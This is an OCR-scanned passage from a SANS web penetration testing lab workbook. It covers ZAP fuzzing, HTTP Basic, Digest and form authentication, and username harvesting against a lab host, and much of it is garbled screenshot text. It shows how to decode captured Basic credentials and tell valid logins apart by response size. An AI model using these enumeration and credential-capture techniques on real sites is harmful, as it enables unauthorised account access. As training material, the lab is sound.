4... 216 bytes 
2 Fuzzed 
200 OK 
1... 
226 bytes 
'3 Fuzzed 
404 Not Found 
8... 216 bytes 
4 Fuzzed 
404 Not Found 
9... 216 bytes 
5 Fuzzed 
404 Not Found 
1... 
216 bytes 
6 FU?Zed 
404 Not Found 
3... 215 bytes 
7 Fuzzed 
404 Not Found 
8... 215 bytes 
8 Fuzzed 
404 Not Found 
6 .. , 
215 bytes 
9 Fuzzed 
404 Not Fot.md 
6... 215 bytes 
10 Fuzzed 
404 Not Found s... 
215 bytes 
Not Found 
1... 
215 
l.353by .. , 
lliJ ... 
290 bytes 
1.353 by ... 
287 bytes 
285 bytes 
285 bytes 
290 
284 bjkes 
287 bytes 
285 bytes 
285 bytes 
290 bytes 
. 
Cu.rre 
Reflected 
a, beeblebrox 
Reflected 
a. dent 
Reflected 
a, prefect 
Reflected 
a, jones 
Refleded 
a. smtth 
Reflected 
b, beeb!ebrox 
Reflected 
b, dent 
Reflected 
b, prefect 
Reflected 
b, jones 
Reflected 
b, smith 
Reflected 
c, beeblebrox 
- o Jfo~- 
'--' 
'--' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
'--' 
.__,, 
'---' 
.__,, 
.__,, 
'---' 
'---' 
'---' 
...__,,· 
'---' 
'---' 
'--' 
'-.J 
'---' 
'-.J 
'---' 
\...., 
\...., 
\.._., 
'---' 
\.._., 
\.._., 
'--' 
\.._., 
'-.J 
\...., 
...__,, 
'---' 
.__,, 
...__,, 
\.._., 
'-J 
'-.J 
\...., 
'---' 
'---' 
18 
\...., 
\...., 
\.._., 
The Fuzzing Results 
Click ZAP's Code column to sort by the HTIP response code: 
Errors 
RTT 
Slze Resp. Head 
25 "' 227 bytes 
2 
200 OK 
8 ms 
227 bytes 
'>':) 
Fuzzed 
200 OK 
10 
225 bytes 
:.,,.., 
'" 
46 Fuzzed 
200 OK 
IO '" 226 bytes 
71 Fuzzed 
200 OK 
7 ms 
226 bytes 
151 Fuzzed 
200 OK 
10 .. , 
225 bytes 
1 
Fuzzed 
404 Not Found 
29 ,, .. 
215 bytes 
3 Fuzzed 
404 Not Found 
18 '" 216 bytes 
Status Code 200 (successful) results will sort to the top of ZAP's screen 
Here are our results: 
,.. 
Sites 
• 
http://WWW, sec542. org 
,. 
icons 
HTTP /1. l 200 OK 
4 : 
Date: Sat, 20 Jan 2018 06:58:23 GMT 
~: 
Server: Apache/2.4. 7 (Ubuntu) 
Vary:. Accept-Encoding 
Content-Length: 754 
Keep-Alive: timeout=5, max=66 
, 
ConnecJion: Keep-A l:i,y_e,,_ -----,-,=-------=-------''_,_
..- l 
«htnb- 
<head> 
<t i t I 
Sfze Res .. , 
1,353 · y ... 
1.353 by, .. 
748 bytes 
1,160 by, .. 
1,136 by ... 
3 
4 Fuzzed 
5 Fuzzed 
6 
404 
404 
404 Not F.,, 
15 ytes 
216 bytes 
2 .. , 
216 bytes 
1... 
216 bytes 
9 ... 215 bytes 
215 bytes 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
19 
Note that we have adjusted some columns and panes in the screenshot, which you can do as well. 
We have successfully replicated the fuzzing functionality of the find_ accounts script. 
We highlighted the zbeeblebrox request in the screenshot. The response pane confirms the page was 
successfully downloaded; it includes HTML such as: <ti tle>Index of /-zbeeblebrox</ti t Le » 
The ZAP Fuzzer output shows z, beeblebrox in this case, but zbeeblebrox was sent. You may confirm this by 
clicking the Request tab. (The Response tab is shown by default.) 
Final Step 
Be sure to disable the ZAP proxy setting in Firefox so that it does not interfere with future labs. 
Go to the Firefox Proxy Selector drop-down and choose No Proxy. 
'--' 
'--' 
'---' 
'-' 
'-" 
'-'
'-'
'-' 
'--' 
'-" 
'-' 
'--' 
'-" 
.,,, 
SANS 542 - Web Pen Testing and fthkaJ Haddng- Mozilla Firefox 
- + X 
... ~ 
- - - 
/iiExerdses... ::r Mutrllidae 
w1,w1 .sec542.org 
SANS Security 542 - Web Pel 
system Proxy 
i 
. 
... 
"E:tbical Hacking 
B
~ HTIP Re - ests and~ on; 
.Burp 
Hearthleed 
l 
Rat Proxy 
• 
•.• 
a 
l 
!Snake 
I 
· ap 
suto-detec: 
1,1=~~~~~.~ n_:~:~:~~~:~~ti~~~c:~t:~i·:~a~~·=c_ ~~j~~s~i~~··d·,. ! MP a:age Proxies 
;= 
lie,, rererences 
Web Authentication - Digest ' · 
···· --- 
· ··-~- 
... -·· ·=,,-··· 
'-" 
.____., 
'-" 
'-" 
.____., 
'-' 
'--' 
'--' 
.____., 
'-' 
'-" 
'-' 
Ensure No Proxy is set when complete. 
'-' 
'--' 
N-o Pro • 
'--' 
.____., 
'-' 
'-" 
.____., 
'---' 
'--' 
'-" 
'--' 
'-' 
'--' 
'--' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.5: Directory Browsing 
20 
'---' 
'-" 
'-' 
" 
!objectives 
• 
Explore the technical details of Basic, Digest, and Form-based authentication 
• 
Consider how to differentiate success from failure conditions 
• 
Base64 decoding with ZAP and Base64 command-line tool 
Launch ZAP by clicking the ZAP icon in the upper panel at the top of the screen: 
Note: ZAP takes a while to launch, roughly 10 seconds or so. Many students end up accidentally launching 
ZAP two or three times during the delay. Run one instance of ZAP only. 
Multiple instances of ZAP are running if you see this warning: 
In this case, close the additional ZAP instances, leaving the original. When in doubt, close all ZAP instances 
and start over. ZAP must be listening on port 8081 for this lab to work. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
1 
After ZAP starts, launch Firefox by clicking the Firefox icon in the upper panel. 
Configure Firefox to use the running proxy: 
In Firefox, Select ZAP from the Proxy Selector drop-down: 
\....., 
X 
» - 
= 
Auto-detect 
SANS Security 542 - Web Pei 
system Proxy 
Ethical HaCkil,!I 
Ensure ZAP is now chosen as the proxy . 
• 
We have already installed a Firefox extension called Proxy Selector. This enables you to quickly switch 
Firefox between various proxy servers. In this case, we have already configured proxy settings and saved 
them under the name ZAP. To activate the use of ZAP, simply select ZAP from the proxy list on the right 
side of the proxy bar at the top of the Firefox window. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
\....., 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-- 
.,__,, 
'---' 
'--.J"' 
'-' 
'-- 
'-' 
'-...,· 
'-'" 
'-" 
'-- 
'-' 
'--' 
'--' 
'--' 
'-../ 
'-' 
'-' 
\....., 
'-./ 
'---' 
'-' 
'-' 
\....., 
'-' 
.'-' 
'-' 
,~ 
\.._.I 
2 
'-' 
'J 
'-,•' 
This pull-down enables you to automatically configure the browser to use a given web app manipulation 
proxy. 
Note: Always use Proxy Selector to manage Firefox's proxy settings. Do not use other methods. 
Changing the system proxy settings can break future labs. Some system proxy settings attempt to proxy all 
protocols, even ICMP! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
3 
jstep-by-Step.lnstructions 
ZAP - Basic Authentication 
We begin by examing the information sent to the server during a request for a page that is being 
"protected" by Basic Authentication. 
In Firefox go to the Exercises toolbar and choose "Web Authentication - Basic". 
Hlilm Advanced Usernarne Harvesting 
HlllmBASE 
BeEF Control Panel 
e 
~ Heartbt,eed 
Hlilm HTTP Request/ Response 
l• r.1utiHidae 
,Hlllm PHPBB 
UJ;. phpri.,tyAdmin 
Hlilm Srnike 
Hlilm SheHshock Netstat.cgi 
Hlilm 
Inject Me 
Hlilm User Account 
Hlilm Web Authentication - Digest 
Hlilm Web Authentication - Forms 
Hlilm 
Admin 
You will see a pop-up that says 'A username and password are being requested by 
http://www. sec542. org. The site says: "Basic Auth Restricted".' 
"' 
,.. 
)t 
pass.word an:? being requested by http-./lwwv.,.s~org •. The sib:~ "Basic 
fl 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
'--' 
\.._..., 
'--' 
-.__, 
'-'
'--'
'-J
'-J
'-'
'-J
'-'
'---' 
'-'
'-J
·-.__, 
'-'
'-J
'-J
\.._..., 
'-J
'--' 
\.._...,
'-' 
-.__, 
'-J
'--' 
-.__, 
'-J
'---' 
'-' 
\__,.
'-' 
-.__, 
'-' 
'---' 
'--' 
'-' 
"- 
'-' 
4 
'--' 
'-' 
'-' 
Now we look at what the initial request and response look like in ZAP. 
Switch to ZAP. 
In the left Sites window, drill down to http://www.sec542.org -> GET:basic. 
fJle Edit ;tiew analyse Beport Iools Qnline J::!.elp 
"'t5! Contexts 
i'.E Default Context 
'"Qi fJ; Sites 
T ~ ,f./J http://www.sec542 
GET http://w.r,1.sec542.org/basic/ HTTP/1.1 
User-Agent: 
Mozilla/5.0 (Xll; Ubuntu; Linux i686; rv:34.0)! 
Gecko/20100101 Firefox/34.0 
Accept: text/html,appl1cat1on/xhtml+xml,appl1cat1on/xml;q= 
I 
ccept- Language: en - US, en; q=O. 5 
(I 
teferer: http://"r.r,,1.sec542.org; 
--~ 
Output + 
1 
11/11/15... 
GET 
http://WWw.sec542.org/b... 
4... 
Una... 
460 byt .. , ~ Me ... 
t,./erts ni O 
F'll 1 
Click the Request tab and review the details of the request. 
"' ejj Contexts 
i GET http:/ /vr,,r, 
ec542. o rg/bas1 c/ HTTP/ 1. 1 
11:J Default Context 
i \user-Agent: 
z i lla/5. o (Xll; Ubuntu; Linux 
'"ti I'll Sites 
. ,1Gecko/201 
01 Fi refox/34. O 
'"kA rla http:/N,ww. sec542/ 'Accept: t_xt/html, app licati on/xhtml+xml, app lication/xml; 
0.9,*/*;q=0.8 
Accept-Language: en-US,e.n;q=0.5 
Ref ere r: http:/ /•,Mw. sec542. o rg/ 
·~~ Search f'I Alerts 
@ $ y' Filter:OFF 
Id 
j Req, Tim .. , 
i Me .. , I URL 
I c ... ! Rea,:: ; .. .jsize Re ... i Highe ... j .. :': Tags 
1 
11/11/15 .. , 
GET 
http:/J•,vww·. sec 542. orqrb .. , 
4... una. 
.. , 
460 byt.. tt Me ... 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
5 
Click on the "Response" tab to view the server's response to the initial HTTP GET request. 
file Edit ',{iew /'.l,nalyse .Beport Iools Q.nline .t!elp 
- 
I 
.'-' 
HTTP/1.1 401 Unauthorized 
Date: Wed, 11 Nov 2015 21:03:16 GMT 
Server: Apache/2.4.7 (Ubuntu) 
\•fr.•M- Authenticate: Basic realm=" Basic Auth Restricted" 
Content-Length: 460 
I 
I
. 
Keep-Alive: timeout=S, max=lOO 
Connection: Keep-Alive 
. 
. . C••••••·Typ,, ••••Jh•ml; ,h,,,••~••·0059·1 
. ' 
-2 '"h. '-,-----___,,,_..---------=~-----=-=-----=---,-----------------------,,..---,,------,-- 
i'e/<t> Search j ~ Alerts 
@ Q \f Filter:OFF 
j Req. Tim ... 'Me ... J URL 
l c... I Rea .. , 
( ... I Size Re ... l Highe .. ,j 
... ] Tags 
1 11/11/15... 
GET 
http:/twww. sec542. or·g/b .. , 
4... una.. 
. .. 
460 byt... 
[Ill Me ... 
0 
Note the status code "401 Unauthorized". 
Note also the server responds with an HTTP Header: 
WWW-Authenticate: Basic realm="Basic Auth Restricted" 
Switch back to Firefox and supply an incorrect username and password in the pop-up box: 
baduser:badpass 
The pop-up will immediately return, indicating authentication failed. 
Now provide the correct credentials of marvin as the username and paranoid as the password: 
,A.uthentic:.ttim Requ-irtd 
+ ~· 
marvin 
········! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
\..._.;
'-' 
..__..,
'--'
'-' 
'-J
'-'
'-'
'----' 
'-..../ 
'-' 
"---- 
'-'
'----' 
'-' 
..__.., 
'-J 
'-J 
'-' 
'-' 
'-J 
'-J
'-..../ 
'-J 
'-' 
'-' 
..__.., 
'-' 
'-' 
'-"' 
'-' 
'-' 
'-' 
'-"' 
'-' 
'-' 
\__, 
6 
\__, 
'---" 
'---" 
You see a vintage NASA photo, and a message indicating successful basic authentication. 
- - 
Successful Basic Authentication! 
Enjoy an image from the Apollo 7 mission, courtesy of the Project Apollo Archive {htlp:l/www.apolloarchive.com/ or 
simply Google "Project Apollo Archive") 
If you're wondering how we know these usernames and passwords, great minds think alike! 
Yes, we are supplying both usernames and passwords for this exercise. 
Username harvesting and password guessing exercises are coming up later. Our goal, for now, is to 
understand basic web authentication methods. 
,,........ 
Switch back to ZAP, and find the http://www. sec542. org/basic/ requests under the History tab. 
Select the request to http://www. sec542. org/basic/ with a 200 status code. Then select the 
Request tab: 
'f ~ Sites 
" D l~ http:/twww.sec542.org 
,. Wimages 
GET http://w"W,sec542.org/basic/ KTTP/1.1 
User-Agent: 
Mozi Ha/5. O (Xll: Linux i686: rv: 50. O) Gecko/20100101 Firefox/SO 
,0 
Accept: text/html. app l icati on/xhtn l+xm l. app Li cat i on./xm l; q=O. 9, * /*: q=O. 8 
Accept-Language: en-US,en:q=0,5 
R.eferer: http://°""""'.sec542.org/ 
Connection: keep- alive 
Search 
lflii Alerts 
@) ~ 'g' Filter: OFF f Export 
Id 
i Req, Tlmestamp 
I Met .. 
Size R .. , 
Hiqhest.i. j Note 
Tags 
1 
1/19/18 11:20:53 PM 
GET 
http://W'l.w,sec542.org/basic/ 
3 1/19/18 11:21:08 PM 
GET 
http:/fw;.w,sec542.org/basiC/ 
460 b.. 
P, Low 
460 b ... 
,(, Low 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
7 
Find the HTTP Authorization header and highlight the encoded string found after "Authorization: Basic": 
it) 
Contexts 
(@J Default Context 
• (j Sites 
1f § I'll http://WWW. sec542. org 
CK.' 
=z 
. 
I ii< GET,basic j''L;:;•yzr-.. 
","v 
,. [w images 
GET http,//ww.sec542.org/basic/ HTTP/1.1 
User-Agent: Mozi ll.a/5. 0 (Xll; Linux i686; rv: 50. 0) Gecko/20100101 Fi refox/50 
.0 
Accept: text/html, app lication/xhtml+xml, app l i.cat i cn/xe l; q=O. 9, • t•; q=0, 8 
Accept-Language: en-US,en;q=0.5 
R.eferer: http://wW.sec542.org/ 
Connection: keep-alive 
Upgrade-Insecure-Re 
Authorization: Basi 
Host: ww.sec542.org 
Output I+ 
td 
1 Req. Tlrnestamp 
MeL i URL 
Highest... Note 
Tags 
1 
1/19/18 11:20:53 PM 
GET 
http:/twww.sec542.org/basic/ 
3 1/19/18 11:21:08 PM 
GET 
http://wW.v.5ec542.or_g_/basic/ 
1 RIT 
401 Unauthorized 
17 ms 
460 b .. , 
RI Low 
401 
Unauthorized 
9 ms 
460 b... ?> Low 
Note: If you don't see the "Authorization: Basic" header, you may have chosen the wrong request. 
Right-click on the highlighted string and select Encode/Decode/Hash ... : 
• 
·.ft 
"l 
Contexts 
ts\1J Default Context 
• 8 Sites 
" 0 I'll http:/twww.sec542.org 
I• GET:basic~~d<~ic·,;_:..:0,,"f.i:;;,:; 
,. i "': images 
GET http://l,'\,tw.sec542.org/basic/ HTTP/1,1 
• 
User-Agent: Mozilla/5.0 (Xll: Linux i686; rv:50.0) Gecko/20100101 Firefox/50 
.0 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5 
R.eferer: http://W'W"tl.sec542.org/ 
Connection: keep-alive 
Upgrade-Insecure-Re 
Authorization: Ba 
Host: W'W"tl.sec542.org 
C 
Output 
@ Q '\{ Filter: OFF ,t' Export 
Id 
I Req. Timestamp 
Run application 
Open/Resend with Request Editor.,. 
Open URL in System Browser 
MeL., 
URL 
C... 
Reason 
1 
1/19/18 11:20:53 PM 
3 1/19118 11:21:08 PM 
'' ILl&,l.dl ql] 8,J 1,21•,l.4.8Msk..'..GE'f~-~ht:t!7"1lwww.se>c'ii42 nrntba,;:i1t~2anam~,~ 
.. :11{t;;i.;, 
GET 
http://V.ww.sec542.org/basic/ 
GET 
http://yV_,nw. sec~42._or-_g/basiC/ 
401 
Unauthorized 
401 Unauthorized 
Open URL in Browser 
Syntax 
View 
i.arrt !Jndc 
Csn't Bectc 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
...__, 
...__, 
...__, 
'--" 
...__, 
...__, 
...__, 
'--" 
'--" 
'--" 
..__,, 
'--" 
...__, 
'--" 
...__, 
'--" 
..__,, 
'--" 
'--" 
'-./ 
'-,/ 
..__,, 
..__,, 
'--" 
...__, 
..__,, 
..__,, 
'--" 
..__,, 
'--" 
...__, 
..__,, 
'--" 
...__, 
'--" 
...__, 
'-./ 
'--" 
8 
\J 
'--" 
...__, 
Select the Decode tab and the credentials submitted should be revealed under the Base 64 Decode box: 
! 
I 
:bWFydmluOnBhcmFub21k 
~·~ L. .... ·0-------------..-.,a 
l 
The username and password appear immediately as they are simply Base64 encoded. No decryption key 
was required as this is not encryption, but mere encoding. One of the major complaints about HTIP Basic 
Authentication is illustrated by this simple decoding we just performed. Http Digest Authentication, the 
next authentication method we will use in this lab, seeks to improve upon this aspect. 
Let's manually Base64 decode the credentials on the command line 
Why? We sometimes encounter Base64-encoded credentials via other methods. Keep this in mind for 
,,...... 
future reference! 
,,....._ 
Highlight the encoded string found after Authorization: Basic, right-click on the string, and select "Copy". 
l~~!~~r~t!~~~4
~~~~~ b."'r-
·'-=
~=-
•l=u.::..
on-""B_
hc"-
·1_
A:J"-
·b=2·..c.
tk 
--j 
Find... 
Ctr!+ F 
Encode/Decode/Hash ... 
O Fuzz ... 
Run application 
OpeniR.esend with Request Editor ... 
Open URL in System Browser 
l==========L--...:._ 
Open URL in Browser 
.. 
... 
• 
c542. orgtbasic/ 
c542.orgfbasic/ 
•• 
Ctr!+Z 
Ctr!+Y 
Ctd+Y. 
ctrl+C 
Qe!ete 
Delete 
Select [\JI 
Monitor clients 
Ctrl+A 
Save Raw 
• 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
9 
Open a terminal and type: 
'---' 
echo ~WFydmluOnBhcmFub21k 
""' 
rermin,al 
- 
File 
Edit 
Term ina I 
Tabs 
,.._ 
~,ccc.~·,.cc"'·-,-~- 
[-] $ echo bWFydmluOnBhcmFub2lk I bas·e6-4 ~d 
ma rvtn: paranoid (-] $, I 
Do not type the encoded string! Simply paste it in. In other words, type: 
$ echo 
Then paste the string (Terminal - > Edit-> Paste) 
Then type: 
I 
base64 -d 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
'-../ 
'-' 
'-' 
'-../ 
'-' 
'--' 
'-../
'-...., 
'-...., 
'-' 
'-' 
'-...., 
'-../
'-../
'-../ 
'-' 
'-../ 
'-...., 
'-...., 
'-../ 
'-" 
'-../ 
'-" 
'-...., 
'-../ 
'-../ 
'-../ 
'-" 
'-....,
'-' 
'-" 
'-" 
'-" 
'- 
'----- 
'-...., 
10 
'-' 
'-' 
'-...., 
ZAP - Digest Authentication 
Switch back to Firefox, go to the Exercises tool bar, and choose "Web Authentication - Digest". 
Fail to log in by submitting invalid credentials in the pop-up box: baduser as the username and 
badpassword as the password. 
The pop-up box immediately returns, indicating a failed login. 
Now supply the valid credentials trillian as the username and towel as the password: 
Switch back to ZAP. 
In the "Sites" window, select http://www.sec542.org -> GET:digest 
Scroll down in the Request window to see the authentication credentials that were sent. 
Note the eventual HTIP 200 OK response that corresponds to the correct credentials: 
• «il,} Sites 
http://WWW, sec542. org 
iGET http://ww.sec542.org/digest/ HTTP/1.1 
;user-Agent: Hozilla/5.0 (Xll; Linux i686; rv:50.0) Gecko/20100101 Firefox/50.0 
!Accept: text/html, app lication/xhtml+xmL app l icat i on/xal • q=O. 9, */*: q=O. 8 
jAccept-Language: en-US,en:q=0,5 
iReferer: http://ww.sec542.org/ 
" Connection: keep-alive 
Upgrade-Insecure-Requests: 1 
Host: WWl,',sec542,org 
output + 
IC ... j Reason 
RTT 
l SiZe R ... I Highest... 
Mote j.Tags IJ~/ 
401 
Unauthorized 
17 ms 
460 b... ft Low 
401 
9 ms 
460 b ... 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
11 
Much like with HTTP Basic Authentication, the HTTP status codes from the server can be used to 
determine valid versus invalid credentials employed. This simple Boolean means that brute forcing, and 
the subsequent discovery of successful authentication, would be rather simple. 
Now, dig into the details of the requests and responses to review some of the differences between HTTP 
Basic and HTTP Digest Authentication. 
Track the nonces from the initial HTTP 401 Authorization Required through the successful authentication 
(HTTP 200 OK): 
Qulck Start j ~ Request 
--~ 
[ Header: Text ;;,,J l Body. Text 
HTTP/1.1 401 Unauthorized 
Date: Sat, 20 Jan 2018 07:34:44 GMT 
Server: Apache/2.4.7 (Ubuntu) 
Content-Length: 460 
Keep-Alive: timeout=5, max=l00 
Connection: Keep-Alive 
• 
" 
Each response (previous screenshot) has a new nonce that is repeated (once) in the following request 
(following screenshot). 
Note: Your nonces will be different. 
Quick Start 
( Header: Text 
,.-J 
Text 
GET http: //w,,,w. sec542. org/digest/ HTTP /1.1 
User- Agent: Mozi l la/s. 0 (Xll; Linux i686; rv : 50. 0) Gecko/20100101 Fi refox/50. 
0 
Accept: text/html,application/xhtml+xml,application/xml;q=0,9,*/*:q=0.8 
Accept-Language: en-US,en:q=0.5 
Refere r: http:/ /WIii, sec542. org/ 
Connection: keep-alive 
Upgrade-Insecure-Requests: 1 
I.At1tb2ci 7Rti PD' . Pi Qft§t 1~ae_cpr~e-"herl1J§Y 5." 
c;al __ m-
11 Dj_Pe?t AIJk9. Res~ rictd~d ll t 
uri=" / 1gest/", 
cp-auth. nc= 
00000001, cnonce-" acd84d8b83523732" 
Host: w-w,sec542.org 
Feel free to attempt (and fail) to decode the "response=" portion of the successful (final) request using 
Encode/Decode/Hash 
This will fail due to auth digest security mechanisms. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
'-...,, 
'-...,, 
'-...,, 
'---" 
'-../ 
------ 
'-...,; 
..___,,
'-...,;
..___,,
'-....,,
..___,, 
'-...,; 
'---" 
'-...,; 
..___,, 
'-...,; 
..___,, 
'-....,, 
'-...,; 
'--" 
'--"
'-...,; 
'--" 
..___,, 
'--" 
''---" 
..___,, 
'-' 
..___,, 
..___,, 
'-....,, 
'-...,, 
..___,, 
..___,, 
'-...,; 
\....., 
'--' 
\....., 
12 
\.._, 
'-...,; 
'-...,; 
ZAP - Forms-Based Authentication 
The final type of authentication we review is HTML Forms-Based Authentication. 
In Firefox go to the Exercises toolbar and choose "Web Authentication - Forms". 
Submit invalid credentials in the HTML Form. 
The page will say "Error Incorrect username or password". 
Click "try again" and supply the valid credentials: ford: galaxy 
),) 
User 
ltord 
Password 
You will see another famous lunar photograph. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
13 
Switch back to ZAP. 
-~ 
~ 
Click the Filter button in the History tab. In the Filter History box that pops up select "Form" under "Tags" 
and press 
11Apply
11
• 
,.. CT Contexts 
riiiJ Default Context 
.. (//ii Sites 
.,. 
-. c; Rl http://W..m.sec542.or< 
' select the required filters below. You can select multiple rows in each 
element. An element is not used for filtering if none of the rows in it are 
selected, 
i IGET http://',r,,;,t,sec542.org/form_auth/form_auth.html HTTP/1.1 
I jUser-Agent: Mozilla/5.0 (Xll; Linux i686; rv:50.0) Gecko/20100101 Firefox/50.0 
·1 
• 
. 
. 
. 
,;q=0.9,*/*;q=0.8 
Ft ter H1stp.ry 
+ X ' 
GET:basic 
GET:digest 
-. § ,');; form_auth 
:.J fl/ GET:form _ auth. h1 
. 
Ir POST:!1!'91n,php(r 
., 
images 
3 1... 
4 1... 
7 L .. 
GET 
GET 
Methods: 
CONNECT 
DELETE 
GET 
HEAD 
OPTIONS 
PATCH 
POST 
PUT 
TRACE 
TR.ACK 
Review the filtered History tab. 
Codes: 
:/twww.s 
Notes:[ Ignore 
1/V'NM,E 
1..;:.. 
._, 
http:/tlVWW, S 
http://www. ~ 
http:/~~ "'""' 
. 
. 
Tags: 
Alertsa 
Informational 
Low 
Medium 
High 
False Positive 
Low 
Medium 
High 
Confirmed 
URL Inc Regex, D 
URL EKc Regex: 
fn 
Look at the details of the two POST requests to /form_ au th/ login. php 
Histoey .I ®._., Search J ~ Alerts 
Output I + 
® Q 
ONTags: 
Id 
P.eq. Timest... I Met... I UP.L 
Code 
i Re ... 
t R .. 
200 OK 
1... 
200 OK 
4 ... 
Size ... I Htgh .. .j N ... 
Tags 
12 11/11/15 1... 
POST 
http://,w>,w,sec542.org/form_auth/login. php 
14 11/11/15 1... 
POST 
http:J/ww•N. sec542.org/form_auth/login. php 
340 
Me .. , 
453 
Me ... 
Fann i" 
Form [ 
tY 
~ 
How can you differentiate a successful from an unsuccessful login? Both successful and unsuccessful login 
attempts result in an HTTP 200 OK response. This can make discerning valid versus invalid credentials more 
difficult. The resultant HTML provides the difference rather than the HTTP Status codes. In this example, 
and also with many real-world applications, the size of the responses can provide a method for 
differentiating valid and invalid credentials. 
V 
.__,, 
'--- 
.__,, 
'-.J 
'-.J 
'-' 
'-.J 
'---' 
'--- 
'-' 
.__,, 
'-.J 
'-' 
'-' 
'-' 
'-' 
'--- 
. .__,, 
.__,, 
'--- 
'--- 
'-' 
'-.J 
___,, 
'-' 
'--- 
'--- 
'-' 
'-.J 
'-' 
'-.J 
'--- 
'--- 
'--' 
'-' 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
14 
~ 
'-' 
'-..., 
Highlight one of the POST requests and review the details. 
Default Context 
"ii) ;ni Sites 
" 
http://W>MN. sec542 
GET:basic 
POST http: //•P»'W. sec 542. org/form_auth/logi n. php HTTP/1. 1 
User-Agent: Mozilla/5.0 {Xll; Ubuntu; Linux i686; 
rv:34.0) 
Gecko/20100101 Firefox/34.0 
Accept: text/html,application/xhtml+xml,application/xml; 
0.9,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5 
Referer: http://www.sec542.org/form_auth;form_auth.html 
Connection: keep-alive 
Content- Type: app li cati on/x-ww.1- form- u r lencoded 
Content-Length: 34 
Host: w1.,rw.sec542.or 
luser=ford&pass=galaxy&button=Login 
I 
®) ~ "f Filter: ON Tags: 
Id 
I Req. Tim ... I Me ... j URL 
I Code ! Re ... i ... 
Siz,.. 
Hig ... jN ... 
12 ll/ll/15... 
PO ... 
http://W>MN.sec542.or /form_auth/1... 
200 OK 
... 
34... 
fli M ... 
' . 
Alerts 
Current Scans 
Are the credentials encrypted or encoded in any way? Though HTIP Basic Authentication has built-in 
weaknesses, forms-based authentication is not necessarily stronger. As we see in this example, the 
credentials here are not even encoded, much less encrypted. 
When finished, press the Filter icon, choose "Clear" and "Apply". 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
15 
Final Step 
Be sure to disable the Burp proxy setting in Firefox so that it does not interfere with future labs. 
Go to the Firefox Proxy Selector drop-down and choose No Proxy. 
_ Sl!ffl;~d1 Pelrt'llffi~ 
M\d ~ical lfw«lllf • Min:ii!Hfrofl»t 
- + X 
Auro--detect 
Proxy 
Burp 
Rat Proxy 
Zap 
Ensure No Proxy is set when complete. 
'9 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.6: Authentication 
'--" 
'-' 
-.__; 
'--" 
'-..../ 
'-' 
'-' 
'-' 
'--' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
.'-' 
'--' 
'-.J 
'--' 
'--' 
'-..../ 
'--" 
'--' 
'-..../ 
'--' 
'--" 
'--" 
'--' 
'--" 
'--' 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'--" 
'--" 
'--" 
16 
'-..../ 
'-..J 
'-...,I 
, J/ , EXf!!_TiCi~e~}~ J:Jsef?cna~e~'ja~i,~stf;g:-/ ;/ .·· 
z 
~- 
--- ~~ 
--x- _ 
----:;-y.,.,,, 
"';-;.- 
; = 
~ 
- 
::..... 
0--:..,- =- 
- 
-- 
- - 
'"'L 
- 7~=~ 
_j/C:::., - 
~ 
I Objectives 
• 
• 
• 
• 
Understand username harvesting techniques 
Use programmatic methods to discern legitimate users 
Discern valid usernames when differences observable in HTML response 
Employ blind techniques for username harvesting without HTML differences 
" 
!challenge: No.Hints 
" 
Harvest valid usernames via these forms: 
,.-----. 
• 
http://www.sec542.org/userenum/1ogin.php 
• 
http://www.sec542.org/userenum/secure1ogin.php 
• 
User adent is valid on both forms. 
The user_ enum script helps with the first form: 
• 
Skip the script if you want to be more challenged. 
ZAP or Burp help with either form: 
• 
They are especially helpful with the second form. 
• 
The previous lecture includes some hints. 
,,....., 
Combine these wordlists to discover additional names: 
• 
-/lastnames 
• 
/opt/wordlists/US-census2000-lastnames-top-100.txt 
Note: "'/lastnames should have been created in a previous exercise (Ex. 2.5 Directory Browsing). 
Step-by-step instructions begin on the next page. 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2. 7: Username Harvesting 
1 
jstep-by-Step Instructions 
Test the Login Form 
Launch Firefox and go to Exercises-> User Account Harvesting. 
Ensure No Proxy is selected on the Proxy Selector tool bar. 
Try a bad username, bad password: 
• 
User: asdf 
• 
Password: asdf 
Then try a good username, bad password: 
• 
User: adent 
• 
Password: asdf 
Take note that a bad username results in a blank form and a valid username remains filled in on the 
subsequent form: 
• 
;;,,.,>! 
\~ 
_ .. ~ V,'1i'i/1N.Sec542.org/userem 'phpe v (! l 
User 
ladent 
Password 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.7: Username Harvesting 
'-'
'-'
"-' 
'---' 
'-._,, 
'--'
'-._,, 
'--' 
"-' 
'--' 
'--' 
'--' 
'---' 
'--,/ 
'-"' 
'-._,, 
'-./ 
'-.../
'-.../ 
'--' 
'-"' 
'-._,, 
'--' 
'--' 
'-._,, 
'---' 
